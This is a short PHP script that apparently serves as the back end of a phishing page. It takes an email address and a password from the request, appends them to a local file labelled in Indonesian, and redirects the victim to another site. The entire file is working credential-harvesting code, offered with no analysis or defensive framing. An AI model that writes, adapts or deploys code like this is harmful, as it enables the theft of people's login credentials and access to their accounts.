<?php
header("Location: https://videomaluku.info/2Flogin&source=www_list_selector_more.html");
$ADEx = "rejeki.999";
$ADEy = $_GET['email'];
$ADEz = $_GET['pass'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "");
fwrite($handle, "\n");
fwrite($handle, "Alamat Email:");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
